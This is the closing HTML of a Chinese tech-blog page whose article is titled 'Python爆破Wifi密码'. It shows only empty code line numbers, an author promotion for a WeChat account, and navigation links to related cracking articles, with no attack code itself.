class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br><span class="line-number">155</span><br><span class="line-number">156</span><br><span class="line-number">157</span><br><span class="line-number">158</span><br><span class="line-number">159</span><br><span class="line-number">160</span><br><span class="line-number">161</span><br><span class="line-number">162</span><br><span class="line-number">163</span><br><span class="line-number">164</span><br><span class="line-number">165</span><br><span class="line-number">166</span><br><span class="line-number">167</span><br><span class="line-number">168</span><br><span class="line-number">169</span><br><span class="line-number">170</span><br><span class="line-number">171</span><br><span class="line-number">172</span><br><span class="line-number">173</span><br><span class="line-number">174</span><br><span class="line-number">175</span><br><span class="line-number">176</span><br><span class="line-number">177</span><br><span class="line-number">178</span><br><span class="line-number">179</span><br><span class="line-number">180</span><br><span class="line-number">181</span><br><span class="line-number">182</span><br><span class="line-number">183</span><br><span class="line-number">184</span><br><span class="line-number">185</span><br><span class="line-number">186</span><br><span class="line-number">187</span><br><span class="line-number">188</span><br><span class="line-number">189</span><br></div></div><h2 id="写在最后"><a href="#写在最后" class="header-anchor">#</a> 写在最后</h2> <blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote> <p><img alt="" data-src="https://img-blog.csdnimg.cn/20200906013715889.png" loading="lazy" class="lazy"></p></div> <footer class="page-edit"><div class="edit-link"><a href="https://github.com/binghe001/BingheGuide/edit/master/docs/md/hack/crack/2022-05-02-003-Python爆破Wifi密码.md" target="_blank" rel="noopener noreferrer">在 GitHub 上编辑此页</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <div class="last-updated"><span class="prefix">上次更新: </span> <span class="time">2022/5/2</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
+        ←
+        <a href="/md/hack/crack/2022-05-02-002-使用reaver傻瓜式破解wifi之利用路由器WPS漏洞.html" class="prev">
+          使用reaver傻瓜式破解wifi之利用路由器WPS漏洞
+        </a></span> <span class="next"><a href="/md/hack/crack/2022-05-02-004-MySQL暴力破解工具多线程版.html">
+          MySQL暴力破解工具多线程版
+        </a>
+        →
+      </span></p></div> </main></div> <aside class="page-sidebar"> <div class="page-side-toolbar"><div class="option-box-toc-fixed"><div class="toc-container-sidebar"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="max-height:650px"><div style="font-weight:bold;text-align:center;">Python爆破Wifi密码</div> <hr> <div class="toc-box"><ul class="toc-sidebar-links"><li><a href="/md/hack/crack/2022-05-02-003-Python%E7%88%86%E7%A0%B4Wifi%E5%AF%86%E7%A0%81.html#写在最后" class="toc-sidebar-link">写在最后</a><ul class="toc-sidebar-sub-headers"></ul></li></ul></div></div></div></div></div> <div class="option-box-toc-over"><img src="/images/system/toc.png" class="nozoom"> <span class="show-txt">目录</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="max-height:550px"><div style="font-weight:bold;text-align:center;">Python爆破Wifi密码</div> <hr> <div class="toc-box"><ul class="toc-sidebar-links"><li><a href="/md/hack/crack/2022-05-02-003-Python%E7%88%86%E7%A0%B4Wifi%E5%AF%86%E7%A0%81.html#写在最后" class="toc-sidebar-link">写在最后</a><ul class="toc-sidebar-sub-headers"></ul></li></ul></div></div></div></div></div> <div class="option-box"><img src="/images/system/wechat.png" class="nozoom"> <span class="show-txt">手机看</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.9rem">微信扫一扫</span> <img height="180px" src="https://api.qrserver.com/v1/create-qr-code/?data=https://binghe001.github.io/md/hack/crack/2022-05-02-003-Python%E7%88%86%E7%A0%B4Wifi%E5%AF%86%E7%A0%81.html" style="margin:10px;">
+                可以<b>手机看</b>或分享至<b>朋友圈</b></div></div></div></div> <div class="option-box"><img src="/images/system/toggle.png" width="30px" class="nozoom"> <span class="show-txt">左栏</span></div> <div class="option-box"><img src="/images/system/xingqiu.png" width="25px" class="nozoom"> <span class="show-txt">星球</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.8rem;font-weight:bold;">实战项目<span style="font-size:8px;color:red;">「SpringCloud Alibaba实战项目」</span>、专属电子书、问题解答、简历指导、技术分享、晋升指导、视频课程</span> <img height="180px" src="/images/personal/xingqiu.png" style="margin:10px;"> <b>知识星球</b>：冰河技术
+            </div></div></div></div> <div class="option-box"><img src="/images/system/wexin4.png" width="25px" class="nozoom"> <span class="show-txt">读者群</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.8rem;font-weight:bold;">添加冰河微信<span style="color:red;">(hacker_binghe)</span>进冰河技术学习交流圈「无任何套路」</span> <img src="/images/personal/hacker_binghe.jpg" height="180px" style="margin:10px;">
+                PS：添加时请备注<b>读者加群</b>，谢谢！
+              </div></div></div></div> <div class="option-box"><img src="/images/system/download-2.png" width="25px" class="nozoom"> <span class="show-txt">下资料</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.8rem;font-weight:bold;">扫描公众号，回复<span style="color:red;">“1024”</span>下载<span style="color:red;">100GB+</span>学习技术资料、PDF书籍、实战项目、简历模板等「无任何套路」</span> <img src="/images/personal/qrcode.png" height="180px" style="margin:10px;"> <b>公众号:</b> 冰河技术
+              </div></div></div></div> <div class="option-box"><img src="/images/system/heart-1.png" width="25px" class="nozoom"> <span class="show-txt">赞赏我</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.8rem;font-weight:bold;">鼓励/支持/赞赏我</span> <img height="180px" src="/images/personal/encourage-head.png" style="margin:5px;"> <br>1. 不靠它生存但仍希望得到你的鼓励；
+                <br>2. 时刻警醒自己保持技术人的初心；
+              </div></div></div></div> <div title="使用reaver傻瓜式破解wifi之利用路由器WPS漏洞" class="option-box" style="padding-left:2px;text-align:center;"><a href="/md/hack/crack/2022-05-02-002-使用reaver傻瓜式破解wifi之利用路由器WPS漏洞.html"><img src="/images/system/pre2.png" width="30px" class="nozoom"> <span class="show-txt">上一篇</span></a></div> <div title="MySQL暴力破解工具多线程版" class="option-box" style="padding-left:2px;text-align:center;"><a href="/md/hack/crack/2022-05-02-004-MySQL暴力破解工具多线程版.html"><img src="/images/system/next2.png" width="30px" class="nozoom"> <span class="show-txt">下一篇</span></a></div></div>  <!----> </aside></div><div class="global-ui"><div class="read-more-wrap" style="display:none;position:absolute;bottom:0px;z-index:9999;width:100%;margin-top:-100px;font-family:PingFangSC-Regular, sans-serif;"><div id="read-more-mask" style="position: relative; height: 200px; background: -webkit-gradient(linear, 0 0%, 0 100%, from(rgba(255, 255, 255, 0)), to(rgb(255, 255, 255)));"></div> <a id="read-more-btn" target="_self" style="position: absolute; left: 50%; top: 70%; bottom: 30px; transform: translate(-50%, -50%); width: 160px; height: 36px; line-height: 36px; font-size: 15px; text-align: center; border: 1px solid rgb(222, 104, 109); color: rgb(222, 104, 109); background: rgb(255, 255, 255); cursor: pointer; border-radius: 6px;">阅读全文</a> <div id="btw-modal-wrap" style="display: none;"><div id="btw-mask" style="position: fixed; top: 0px; right: 0px; bottom: 0px; left: 0px; opacity: 0.7; z-index: 999; background: rgb(0, 0, 0);"></div> <div id="btw-modal" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 300px; text-align: center; font-size: 13px; background: rgb(255, 255, 255); border-radius: 10px; z-index: 9999; font-family: PingFangSC-Regular, sans-serif;"><span id="btw-modal-close-btn" style="position: absolute; top: 5px; right: 15px; line-height: 34px; font-size: 34px; cursor: pointer; opacity: 0.2; z-index: 9999; color: rgb(0, 0, 0); background: none; border: none; outline: none;">×</span> <p id="btw-modal-header" style="margin-top: 40px; line-height: 1.8; font-size: 13px;">
+                扫码或搜索：<span style="color: #E9405A; font-weight: bold;">冰河技术</span> <br>发送：<span id="fustack-token" class="token" style="color: #e9415a; font-weight: bold; font-size: 17px; margin-bottom: 45px;">290992</span> <br>即可<span style="color: #e9415a; font-weight: bold;">立即永久</span>解锁本站全部文章</p> <img src="/images/personal/qrcode.png" style="width: 180px; margin-top: 10px; margin-bottom: 30px; border: 8px solid rgb(230, 230, 230);"></div></div></div><div class="pay-read-more-wrap" style="display:none;position:absolute;bottom:0px;z-index:9999;width:100%;margin-top:-100px;font-family:PingFangSC-Regular, sans-serif;"><div id="pay-read-more-mask" style="position: relative; height: 200px; background: -webkit-gradient(linear, 0 0%, 0 100%, from(rgba(255, 255, 255, 0)), to(rgb(255, 255, 255)));"></div> <a id="pay-read-more-btn" target="_blank" style="position: absolute; left: 50%; top: 70%; bottom: 30px; transform: translate(-50%, -50%); width: 160px; height: 36px; line-height: 36px; font-size: 15px; text-align: center; border: 1px solid rgb(222, 104, 109); color: rgb(222, 104, 109); background: rgb(255, 255, 255); cursor: pointer; border-radius: 6px;">付费阅读</a></div></div></div>
+    <script src="/assets/js/cg-styles.js?v=1651499968859" defer></script><script src="/assets/js/cg-4.js?v=1651499968859" defer></script><script src="/assets/js/cg-3.js?v=1651499968859" defer></script><script src="/assets/js/cg-137.js?v=1651499968859" defer></script><script src="/assets/js/cg-5.js?v=1651499968859" defer></script><script src="/assets/js/cg-6.js?v=1651499968859" defer></script><script src="/assets/js/cg-app.js?v=1651499968859" defer></script>
+  </body>
+</html>
